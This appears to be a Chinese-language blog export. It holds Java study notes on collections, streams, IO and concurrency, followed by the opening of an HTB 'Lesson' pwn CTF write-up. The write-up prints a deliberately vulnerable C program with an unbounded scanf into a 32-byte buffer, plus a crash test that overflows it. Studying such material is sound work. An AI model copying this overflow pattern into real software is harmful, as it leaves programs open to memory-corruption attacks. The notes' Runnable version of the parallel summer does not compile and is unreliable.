有序（Geordnete Collection）。 允许重复（Duplikate erlaubt）。 支持通过 索引 (Index) 访问元素（如 get(int index)）。 常用实现类： ArrayList：基于动态数组，查询快，增删慢。 LinkedList：基于链表，增删快，查询慢。 Map&lt;K, V&gt; 接口 特点： 模拟数学中的函数映射。 存储 Key-Value (键值对)。 Key 不允许重复（每个 Key 最多映射到一个 Value）。 核心方法： put(K key, V value): 存入数据。 get(Object key): 根据键取值。 keySet(): 返回所有键的集合（是一个 Set）。 values(): 返回所有值的集合（是一个 Collection）。 Collections 工具类 (Algorithms)Collections 类包含了一堆静态方法，用来操作集合 ： sort(List): 对列表进行排序。 reverse(List): 反转列表顺序。 disjoint(c1, c2): 检查两个集合是否没有交集（完全不相关）。 frequency(c, o): 统计元素 o 在集合 c 中出现的次数。 replaceAll(list, old, new): 批量替换。 Lambda 表达式与流（Streams）Lambda 表达式在 Lambda 出现之前，如果我们想把一段“逻辑”当作参数传递给方法（比如定义排序规则），我们必须创建一个匿名内部类。这通常意味着要写 5-6 行代码，而其中真正有用的逻辑只有 1 行。 Lambda表达式旨在消除这种“样板代码” (Boilerplate Code)。 语法结构Lambda 本质上是一个匿名函数（没有名字的方法）。 语法：(参数列表) -&gt; &#123; 方法体 &#125; 示例： 无参数：() -&gt; System.out.println(&quot;Hi&quot;) 有参数：(x) -&gt; x * x 多行逻辑：(x, y) -&gt; &#123; int sum = x + y; return sum; &#125; () -&gt; &#123;... ; ...&#125; 注意，写多行逻辑时必须要用&#123;&#125;把要执行的逻辑包起来，否则会报错。 例子： 匿名内部类： 123456Collections.sort(list, new Comparator&lt;String&gt;() &#123; @Override public int compare(String s1, String s2) &#123; return s1.compareTo(s2); &#125;&#125;); Lambda 表达式： 12// 编译器会自动推断 s1 和 s2 的类型Collections.sort(list, (s1, s2) -&gt; s1.compareTo(s2)); Lambda 表达式只能用于函数式接口，即只包含一个抽象方法的接口。 方法引用方法引用（method reference），是 lambda 的一种简写形式。 例子： 我们想对每个元素调用String.valueOf函数： 1x -&gt; String.valueOf(x) 那么我们可以直接简写成这样： 1String::valueOf 流 API (Streams)什么是 Stream？ 它不是数据结构（不像 List 或 Set 那样存储数据）。 它是对数据源（集合、数组）进行操作的管道 (Pipeline)。 核心思想：你可以像工厂流水线一样，对数据进行一系列的加工处理。 使用 Stream 的标准步骤： 创建流 (Source)：从数据源生成流。 list.stream() 中间操作 (Intermediate Operations)：对数据进行处理，惰性执行 (Lazy)。 这些操作返回的还是一个 Stream，所以可以链式调用。 终止操作 (Terminal Operations)：触发流的执行，并产生最终结果。 这步之后，流就关闭了，不能再用了。 stream的函数的参数里可以直接写Lambda表达式，非常方便。 常用的 Stream 操作创建： Stream.of(a, b, c) 少量固定元素（对象类型）。 1Stream.of(one, two, three) Arrays.stream(array) 从数组创建。对象数组 → Stream&lt;T&gt;；基本类型数组 → IntStream/LongStream/DoubleStream。 12Arrays.stream(caughtFish)Arrays.stream(intArray) // IntStream collection.stream() 从集合创建（顺序取决于集合类型）。 1caughtFish.stream() Stream.generate(supplier) 无限流，按需调用 supplier.get() 生成元素（通常要配 limit）。 1Stream.generate(supplier).limit(100) （常见补充）Stream.iterate(seed, next) 按规则生成序列（也常是无限）。 1Stream.iterate(0, x -&gt; x + 1).limit(10) 中间操作： 变换 / 映射 map(f)：每个元素变成另一个元素（x 变成f(x) ） 12.map(x -&gt; x * x).map(String::valueOf) flatMap(f)：一个元素变成“多个元素的 Stream”（1→多），再铺平 1.flatMap(fish -&gt; Arrays.stream(birthHelper(fish))) mapToInt：将Stream转成IntStream mapToLong：将Stream转成LongStream mapToDouble：将Stream转成DoubleStream 过滤 filter(pred)：根据条件筛选元素。保留 predicate 为 true 的元素 12.filter(x -&gt; x &gt;= 0).filter(f -&gt; f.weight() &gt;= 0.8) takeWhile(pred)：从头开始保留，直到第一次不满足就停止（Java 9+） 1.takeWhile(f -&gt; f.weight() &gt;= 0.8) dropWhile(pred)：从头开始丢弃，直到第一次不满足后开始保留（Java 9+） 截取 / 跳过 limit(n)：最多取前 n 个（对无限流很重要） 1.limit(50) skip(n)：跳过前 n 个 1.skip(10) 去重 / 排序 distinct()：去重（依赖 equals/hashCode） 1.distinct() sorted() / sorted(comparator)：排序（sorted 稳定排序） 12.sorted().sorted(Comparator.comparingDouble(Fish::weight)) 注意，如果 观察 / 调试（不改变元素） peek(action)：对每个元素做“旁路操作”，常用于打印调试；仍然惰性 1.peek(System.out::println) 终止： 遍历输出 forEach(action)：对每个元素执行操作（并行流顺序不保证） 1.forEach(System.out::println) forEachOrdered(action)：保持顺序（尤其用于并行流） 收集成容器 toList()：收集成 List（Java 16+，返回不可修改 list） 1List&lt;Fish&gt; list = stream.toList(); collect(Collectors.toList())：经典写法（通常可修改 list） toArray(...)：收集成数组 1Fish[] arr = stream.toArray(Fish[]::new); 聚合 / 归约 reduce(...)：把多个元素合并成一个结果（例如求和、求积、拼接等） 有初始值（identity）版本：返回一个值 1int sum = Stream.of(3, 1, -4).reduce(0, (a, b) -&gt; a + b); 无初始值版本：返回 Optional（空流时没有结果） 1Optional&lt;Integer&gt; sumOpt = Stream.of(3, 1, -4).reduce((a, b) -&gt; a + b); 常见场景：求最大/最小（也可用 max/min） 1Optional&lt;Integer&gt; maxOpt = Stream.of(3, 1, -4).reduce(Integer::max); count()：计数，返回long（元素个数） AnyMatch()：用来判断Stream里是否至少有一个元素满足给定条件（Predicate）。 sum()：计算总和。只有DoubleStream，IntStream，LongStream有这个（数值专用）方法。 一个典型的Stream处理链条通常是这样的： Java 1234567List&lt;String&gt; names = Arrays.asList(&quot;Anna&quot;, &quot;Bob&quot;, &quot;Alice&quot;, &quot;Mike&quot;);names.stream() // 1. 创建流 .filter(name -&gt; name.startsWith(&quot;A&quot;)) // 2. 中间操作：只要A开头的 (Anna, Alice) .map(name -&gt; name.toUpperCase()) // 2. 中间操作：转大写 (ANNA, ALICE) .sorted() // 2. 中间操作：排序 (ALICE, ANNA) .forEach(name -&gt; System.out.println(name)); // 3. 终止操作：打印 输入与输出 核心概念：流 (Stream)Java 中的 IO 操作基于流 (Stream) 的概念。流是一个有序的数据序列，有一个源头（Source）和一个目的地（Sink）。 输入流 (Input Stream)：用于从源头（如文件、键盘、网络）读取数据。 输出流 (Output Stream)：用于向目的地（如文件、屏幕、网络）写入数据。 面向字节的输入/输出 (Byteweise Ein- und Ausgabe)这一部分处理的是原始的二进制数据（8位字节），适用于图像、音频或任何非文本数据。 基类 (抽象类)： InputStream: 所有字节输入流的父类。核心方法是 read()，每次读取一个字节 。 OutputStream: 所有字节输出流的父类。核心方法是 write(int b) 。 标准输入/输出： System.in: 标准输入流 (InputStream)，通常指键盘输入 。 System.out 和 System.err: 标准输出流 (PrintStream)，通常指控制台屏幕 。 常用实现类： FileInputStream / FileOutputStream: 用于从文件读取或向文件写入字节 。 装饰器模式 (Decorator Pattern)：为了增强功能，Java 允许将流“层层包裹”。 DataInputStream / DataOutputStream: 允许直接读写 Java 基本数据类型（如 readInt(), writeDouble()），而不仅仅是字节 。 例子：new DataInputStream(new FileInputStream(&quot;file.txt&quot;))。 示例代码逻辑： 文件复制：通过循环调用 read() 读取字节直到返回 -1，然后用 write() 写入 。 123456789101112import java.io.*;public class FileCopy &#123; public static void main(String[] args) throws IOException &#123; FileInputStream file = new FileInputStream(args[0]); int t; // 核心逻辑：循环调用 read() 读取字节，直到返回 -1 while(-1 != (t = file.read())) System.out.print((char)t); // 这里演示为输出，也可以改为写入文件 System.out.print(&quot;\\n&quot;); &#125;&#125; 面向字符的输入/输出 (Textuelle Ein- und Ausgabe)这一部分处理的是字符数据（16位 Unicode），专门用于处理文本文件，解决了字符编码问题。 基类 (抽象类)： Reader: 所有字符输入流的父类 。 Writer: 所有字符输出流的父类 。 桥接流 (转换流)： InputStreamReader 和 OutputStreamWriter: 它们是字节流和字符流之间的桥梁，负责将字节流解码为字符流，或将字符流编码为字节流 。 常用实现类： FileReader / FileWriter: 方便地读取和写入文本文件 。 BufferedReader: 非常重要。它提供了缓冲功能，提高了读取效率，并且提供了 readLine() 方法，可以一次读取一行文本 。 PrintWriter: 提供了方便的打印方法（如 println()），常用于输出文本 。 示例代码逻辑： 统计行数：使用 BufferedReader 包装 FileReader，循环调用 readLine() 直到返回 null 。 1234567891011121314import java.io.*;public class CountLines &#123; public static void main(String[] args) throws IOException &#123; FileReader file = new FileReader(args[0]); BufferedReader buff = new BufferedReader(file); int n = 0; // 核心逻辑：循环调用 readLine() 直到返回 null while(null != buff.readLine()) n++; buff.close(); System.out.print(&quot;Number of Lines:\\t\\t&quot;+ n); &#125;&#125; 文件处理例子： 假设我们现在有一个对象Pengui，带3个属性： 1234567891011package pgdp.io;/* * This is equivalent to a class with the properties name, age &amp; weight * and a constructor that takes these properties as arguments. * The class also has getters named name(), age() &amp; weight(). * The class also has a toString() method that prints the properties. */public record Penguin (String name, int age, double weight) &#123;&#125; 然后我们现在希望利用文件存储/读取这种对象。 写入： 1234567891011public void save(Penguin p, String filename) &#123; try (BufferedWriter w = new BufferedWriter(new FileWriter(filename)) )&#123; w.write(p.name()); w.newLine(); w.write(String.valueOf(p.age())); w.newLine(); w.write(String.valueOf(p.weight())); &#125;catch (IOException e)&#123; throw new RuntimeException(e); &#125; &#125; try()：括号里的东西算with，就是这里定义的东西可以在try的实际部分调用 FileWriter(filename)：负责真正地将内容写入进文件 new BufferedWriter(...)：加一层缓冲，并且提供newLine() 等便捷方法 newLine()：换行 String.valueOf()：数转字符串 IOException：“输入/输出异常”（Input/Output Exception） 读取： 12345678910public Penguin load(String filename) &#123; try (BufferedReader r = new BufferedReader(new FileReader(filename)))&#123; String name = r.readLine(); int age = Integer.parseInt(r.readLine()); double weight = Double.parseDouble(r.readLine()); return new Penguin(name, age, weight); &#125;catch (IOException e)&#123; throw new RuntimeException(e); &#125; &#125; Integer.parseInt()：字符串转int Double.parseDouble()：字符串转double 并行运行与同步创建线程一般有2种方法： 继承Thread：重写 run()，对线程对象调用 start() 后，系统会初始化新线程并并行执行该对象的 run()；当前执行流会继续往下走。 例子： 1234567891011121314public class MyThread extends Thread &#123; public void hello(String s) &#123; System.out.println(s); &#125; public void run() &#123; hello(&quot;I’m running ...&quot;); &#125; // end o f run ( ) public static void main(String[] args) &#123; MyThread t = new MyThread(); t.start(); System.out.println(&quot;Thread has been started ...&quot;); &#125; // end o f main ( )&#125; // end of class MyThread 实现Runnable：实现 run()，用 new Thread(runnableObj) 包一层，再 start()。优点是还能继承别的类。 例子： 1234567891011121314public class MyRunnable implements Runnable &#123; public void hello(String s) &#123; System.out.println(s); &#125; public void run() &#123; hello(&quot;I’m running ...&quot;); &#125; // end o f run ( ) public static void main(String[] args) &#123; Thread t = new Thread(new MyRunnable()); t.start(); System.out.println(&quot;Thread has been started ...&quot;); &#125; // end o f main ( )&#125; // end of class MyRunnable 调度但是这样单纯地创建线程并不能保证它们的实际运行顺序。 start()：进入 ready，等待被调度执行 yield()：让出 CPU（回到 ready 的直觉） sleep()：进入 sleeping，到时间再回 ready 1public static void sleep (int msec) throws InterruptedException join()：进入 joining，等待另一个线程结束 每个线程对象都有一个joiningThreads队列：如果t1调用t2.join()，t1会暂停并等待t2结束；t2结束后会唤醒所有等待它的线程。 例子： 1234567891011121314151617181920212223private static int count = 0;private int n = count++;private static Thread[] task = new Thread[3];public void run() &#123; try &#123; if (n &gt; 0) &#123; task[n-1].join(); System.out.println(&quot;Thread-&quot;+n+&quot; joined Thread-&quot;+(n-1)); &#125; &#125; catch (InterruptedException e) &#123; System.err.println(e.toString()); &#125;&#125;//...public static void main(String[] args)&#123; for (int i=0; i&lt;3; i++)&#123; task[i] = new Thread(new Join()); &#125; for (int i=0; i&lt;3; i++)&#123; task[i].start(); &#125;&#125; 先定义了一个全局的（共享的）数组task，用它来记录每个线程，以便每个线程都可以通过这个数组找到其他线程。所以最后会输出： 12Thread-1 joined Thread-0Thread-2 joined Thread-1 线程3会通过join等待线程2，线程2会等待线程1。 Monitorsynchroized用synchroized来控制需要保护的资源，给它创建kritische Abschnitt。 synchronized只能用在： 方法：public synchronized void openShop() &#123; ... &#125; 代码块：synchronized(this) &#123; ... &#125; 例子： 1234567891011121314151617public class Count &#123; private int count = 0; public synchronized void inc() &#123; String s = Thread.currentThread().getName(); int y = count; System.out.println(s+ &quot; read &quot;+y); count = y+1; System.out.println(s+ &quot; wrote &quot;+(y+1)); &#125;&#125;public class IncSynch implements Runnable &#123; private static Count x = new Count(); public void run() &#123; x.inc(); &#125; public static void main(String[] args) &#123; (new Thread(new IncSynch())).start(); (new Thread(new IncSynch())).start(); (new Thread(new IncSynch())).start(); &#125;&#125; // end of class IncSynch 会输出： 123456Thread-0 read 0Thread-0 wrote 1Thread-1 read 1Thread-1 wrote 2Thread-2 read 2Thread-2 wrote 3 ReadWrit-lock 123456789101112131415161718192021public class RW&#123; private int countReaders = 0; public synchronized void startRead() throws InterruptedException&#123; while(countReaders &lt; 0) wait(); countReaders++; &#125; public synchronized void endRead()&#123; countReaders--; if (countReaders == 0) notifyAll(); &#125; public synchronized void startWrite() throws InterruptedException &#123; while(countReaders != 0) wait(); countReaders = -1; &#125; public synchronized void endWrite()&#123; countReaders = 0; notifyAll(); &#125;&#125; 这里synchronized的作用： 互斥访问：同一时间只能一个线程修改 countReaders（防止竞态） 提供 wait/notify 的前提：wait() 和 notifyAll() 必须在持有同一对象锁时调用（这里锁的是 this） 也就是说：这里把 RW 对象本身当作内部管理锁。 当在实例方法前面写 synchronized 时，它锁的是调用该方法的那个对象（this）的监视器锁。 123class A &#123; public synchronized void f() &#123; ... &#125;&#125; 等价于： 1234567class A &#123; public void f() &#123; synchronized (this) &#123; ... &#125; &#125;&#125; 如果想要分开保护一个对象的不同attribute，可以： 1234567891011121314151617public class A &#123; private final Object lock1 = new Object(); private final Object lock2 = new Object(); public void f() &#123; synchronized(lock1) &#123; // 保护资源1 &#125; &#125; public void g() &#123; synchronized(lock2) &#123; // 保护资源2 &#125; &#125;&#125; volatile而想要监控某个字段的话就需要用volatile，它主要的作用是： 可见性： 写volatile：必须把新值刷新到主内存。 读volatile：必须从主内存读取最新值。 所以等待线程就能看见主线程的更新。 有序性： 会先修改volatile字段，然后其他线程才可以读它。 但是volatile不能确保原子性。 例子： 1234567891011121314151617package pgdp.memoryvisibility;public class BusinessPenguinVolatile &#123; private volatile boolean isShopOpen = false; public void waitForShopToOpen() &#123; while (!isShopOpen) &#123; &#125; System.out.println(&quot;Shop is open!&quot;); &#125; public void openShop() &#123; isShopOpen = true; &#125;&#125; Semaphor可以直接用JAVA里的Semaphor。 例子： 12345678910111213141516171819202122232425import java.util.concurrent.Semaphore;public class Demo1 &#123; static final Semaphore permits = new Semaphore(2); public static void main(String[] args) &#123; Runnable job = () -&gt; &#123; try &#123; permits.acquire(); // 拿到“名额”才能进 System.out.println(Thread.currentThread().getName() + &quot; entered&quot;); Thread.sleep(300); &#125; catch (InterruptedException e) &#123; Thread.currentThread().interrupt(); &#125; finally &#123; permits.release(); // 归还名额 System.out.println(Thread.currentThread().getName() + &quot; left&quot;); &#125; &#125;; for (int i = 0; i &lt; 6; i++) &#123; new Thread(job, &quot;T&quot; + i).start(); &#125; &#125;&#125; .acquire()：请求进入 .release()：退出 Consumer-Producer问题： 设置3个Semaphore： free：控制满了不能放 occupied：控制空了不能取 mutex：控制同时只能一个进程改数组和指针 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import java.util.concurrent.Semaphore;public class Demo3 &#123; static class BoundedBuffer &#123; private final int[] data; private int first = 0, last = 0; private final Semaphore free; private final Semaphore occupied; private final Semaphore mutex = new Semaphore(1); BoundedBuffer(int cap) &#123; data = new int[cap]; free = new Semaphore(cap); occupied = new Semaphore(0); &#125; void produce(int x) throws InterruptedException &#123; free.acquire(); // 没空位就等 mutex.acquire(); // 独占访问数组/指针 data[last] = x; last = (last + 1) % data.length; mutex.release(); occupied.release(); // 增加可取元素 &#125; int consume() throws InterruptedException &#123; occupied.acquire(); // 没元素就等 mutex.acquire(); int x = data[first]; first = (first + 1) % data.length; mutex.release(); free.release(); // 增加空位 return x; &#125; &#125; public static void main(String[] args) &#123; BoundedBuffer buf = new BoundedBuffer(3); Thread producer = new Thread(() -&gt; &#123; try &#123; for (int i = 1; i &lt;= 6; i++) &#123; buf.produce(i); System.out.println(&quot;put &quot; + i); Thread.sleep(80); &#125; &#125; catch (InterruptedException e) &#123; Thread.currentThread().interrupt(); &#125; &#125;); Thread consumer = new Thread(() -&gt; &#123; try &#123; for (int i = 1; i &lt;= 6; i++) &#123; int x = buf.consume(); System.out.println(&quot;take &quot; + x); Thread.sleep(150); &#125; &#125; catch (InterruptedException e) &#123; Thread.currentThread().interrupt(); &#125; &#125;); producer.start(); consumer.start(); &#125;&#125; 例子计算数列和1234567891011121314151617181920212223242526package pgdp.threads;// TODO: Vervollständige diese Klasse, sodass sie einen Thread repräsentiert, der das übergebene Array von lowerBound// (inklusive) bis upperBound (exklusive) summiert und das Ergebnis in result speichert.public class ParallelSummer extends Thread&#123; private final int[] array; private final int lowerBound; private final int upperBound; private long result = 0; public ParallelSummer(int[] array, int lowerBound, int upperBound) &#123; this.array = array; this.lowerBound = lowerBound; this.upperBound = upperBound; &#125; @Override public void run()&#123; for (int i = lowerBound; i &lt; upperBound; i++) &#123; result += array[i]; &#125; &#125; public long getResult() &#123; return result; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package pgdp.threads;import java.util.stream.IntStream;public class Main &#123; public static long sumParallel(int[] array, int threadCount) &#123; if (threadCount &lt;= 0)&#123; throw new IllegalArgumentException(); &#125; if (array.length == 0) return 0; ParallelSummer[] threads = new ParallelSummer[threadCount]; int n = array.length; int chunk = n / threadCount; int start = 0; for (int i = 0; i &lt; threadCount; i++) &#123; int end = (i == threadCount -1)? n : start+chunk; threads[i] = new ParallelSummer(array, start, end); start = end; &#125; for (ParallelSummer w : threads)&#123; w.start(); &#125; for (ParallelSummer w : threads)&#123; try&#123; w.join(); &#125;catch (InterruptedException e)&#123; Thread.currentThread().interrupt(); throw new RuntimeException(&quot;Thread interrupted&quot;,e); &#125; &#125; long result = 0; for (ParallelSummer w : threads)&#123; result += w.getResult(); &#125; return result; &#125; public static void main(String[] args) &#123; int[] toSum = IntStream.range(0, 1_000_000_000).toArray(); long startTime = System.currentTimeMillis(); long result = sumParallel(toSum, 5); long finishTime = System.currentTimeMillis(); System.out.println(&quot;Ergebnis der Berechnung: &quot; + result); System.out.println(&quot;Dauer der Berechnung: &quot; + ( finishTime - startTime ) + &quot;ms&quot;); &#125;&#125; 或者用实现Runnable的写法： 1234567891011121314151617181920212223242526package pgdp.threads;// TODO: Vervollständige diese Klasse, sodass sie einen Thread repräsentiert, der das übergebene Array von lowerBound// (inklusive) bis upperBound (exklusive) summiert und das Ergebnis in result speichert.public class ParallelSummer implements Runnable&#123; private final int[] array; private final int lowerBound; private final int upperBound; private long result = 0; public ParallelSummer(int[] array, int lowerBound, int upperBound) &#123; this.array = array; this.lowerBound = lowerBound; this.upperBound = upperBound; &#125; @Override public void run()&#123; for (int i = lowerBound; i &lt; upperBound; i++) &#123; result += array[i]; &#125; &#125; public long getResult() &#123; return result; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package pgdp.threads;import java.util.stream.IntStream;public class Main &#123; public static long sumParallel(int[] array, int threadCount) &#123; if (threadCount &lt;= 0)&#123; throw new IllegalArgumentException(); &#125; if (array.length == 0) return 0; ParallelSummer[] threads = new ParallelSummer[threadCount]; int n = array.length; int chunk = n / threadCount; int start = 0; for (int i = 0; i &lt; threadCount; i++) &#123; int end = (i == threadCount -1)? n : start+chunk; ParallelSummer thread = new ParallelSummer(array, start, end); Thread t = new Thread(thread); t.start(); &#125; for (ParallelSummer w : threads)&#123; w.start(); &#125; for (ParallelSummer w : threads)&#123; try&#123; w.join(); &#125;catch (InterruptedException e)&#123; Thread.currentThread().interrupt(); throw new RuntimeException(&quot;Thread interrupted&quot;,e); &#125; &#125; long result = 0; for (ParallelSummer w : threads)&#123; result += w.getResult(); &#125; return result; &#125; public static void main(String[] args) &#123; int[] toSum = IntStream.range(0, 1_000_000_000).toArray(); long startTime = System.currentTimeMillis(); long result = sumParallel(toSum, 5); long finishTime = System.currentTimeMillis(); System.out.println(&quot;Ergebnis der Berechnung: &quot; + result); System.out.println(&quot;Dauer der Berechnung: &quot; + ( finishTime - startTime ) + &quot;ms&quot;); &#125;&#125; 常用库","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/en/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://archer-baiyi.github.io/en/tags/Java/"}]},{"title":"HTB Lesson Writeup","slug":"CTF/Pwn/HTB-Lesson-Writeup","date":"2025-08-21T10:49:18.000Z","updated":"2025-08-21T11:08:14.294Z","comments":true,"path":"2025/08/21/CTF/Pwn/HTB-Lesson-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/08/21/CTF/Pwn/HTB-Lesson-Writeup/","excerpt":"一些关于Pwn的基础知识。（包括一些pwn常用的Linux命令）","text":"题目 123456789101112131415161718192021#include &lt;stdio.h&gt;void under_construction()&#123; printf(&quot;This is under development\\n&quot;);&#125;void print_msg(char *user)&#123; char formatter[0x20]; strncpy(formatter, user, 5); for (size_t i = 0; i &lt; 5; i++) formatter[i] = tolower(formatter[i]); printf(strncmp(formatter, &quot;admin&quot;, 5) == 0 ? &quot;\\nWelcome admin!\\n\\n&quot; : &quot;\\nWelcome user!\\n\\n&quot;); &#125;int main(int argc, char **argv)&#123; char name[0x20] = &#123;0&#125;; unsigned long x, y; printf(&quot;Enter your name: &quot;); scanf(&quot;%s&quot;, name); print_msg(name); return 0;&#125; 题解第一题123456789101112This is a quick lesson to get started with the basics.◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉◉ HINT: Run &#x27;file ./main&#x27; to get some information about the binary. ◉◉ ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉[*] Question number 0x1:Is this a &#x27;32-bit&#x27; or &#x27;64-bit&#x27; ELF? (e.g. 1337-bit)&gt;&gt; 12└─$ file ./main./main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=da663acb70f9fa157a543a6c4affd05e53fbcb07, for GNU/Linux 3.2.0, not stripped 所以是64位的。 1234567&gt;&gt; 64-bit♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 第二题123456789101112◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉◉ HINT: Run &#x27;gdb ./main&#x27; to open the binary in the debugger, then ◉◉ run &#x27;checksec&#x27; to see the protections. ◉◉ ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉[*] Question number 0x2:Which of these 3 protections are enabled (Canary, NX, PIE)?&gt;&gt; 1234567891011└─$ checksec ./main Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: &#x27;./glibc/&#x27; SHSTK: Enabled IBT: Enabled Stripped: No 1234567&gt;&gt; NX♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 第三题123456789101112◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉◉ HINT: Pay attention to the &#x27;void print_msg(char *user)&#x27; ◉◉ and the &#x27;strncmp(arg1, arg2, n_bytes)&#x27;. ◉◉ ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉[*] Question number 0x3:What do you need to enter so the message &#x27;Welcome admin!&#x27; is printed?&gt;&gt; 查看源代码即可发现： 1printf(strncmp(formatter, &quot;admin&quot;, 5) == 0 ? &quot;\\nWelcome admin!\\n\\n&quot; : &quot;\\nWelcome user!\\n\\n&quot;); 所以 1234567&gt;&gt; admin♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 第四题1234567891011◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉◉ HINT: This is the buffer --&gt; char name[0x20] = &#123;0&#125;; ◉◉ ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉[*] Question number 0x4:What is the size of the &#x27;name&#x27; buffer (in hex or decimal)?&gt;&gt; 看源码的这里： 1char name[0x20] = &#123;0&#125;; 1234567&gt;&gt; 0x20♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 第五题123456789101112◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉◉ HINT: Only functions inside &#x27;main()&#x27; are called. ◉◉ Also, the functions these functions call. ◉◉ ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉[*] Question number 0x5:Which custom function is never called? (e.g. vuln())&gt;&gt; 1234567&gt;&gt; under_construction♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 第六题1234567891011◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉◉ HINT: Which function reads the string from the stdin? ◉◉ ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉[*] Question number 0x6:What is the name of the standard function that could trigger a Buffer Overflow? (e.g. fprintf())&gt;&gt; 1234567&gt;&gt; scanf()♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ 第七题1234567891011121314◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉◉ HINT: A Segmentation Fault occurs when the return ◉◉ address is overwritten with an invalid address. ◉◉ ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉[*] Question number 0x7:Insert 30, then 39, then 40 &#x27;A&#x27;s in the program and see the output.After how many bytes a Segmentation Fault occurs (in hex or decimal)?&gt;&gt; 12345678910111213└─$ python3 -c &quot;print(&#x27;A&#x27;*30)&quot; | ./mainEnter your name:Welcome user!└─$ python3 -c &quot;print(&#x27;A&#x27;*39)&quot; | ./mainEnter your name:Welcome user!└─$ python3 -c &quot;print(&#x27;A&#x27;*40)&quot; | ./mainEnter your name:Welcome user!Segmentation fault 1234567&gt;&gt; 40♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ 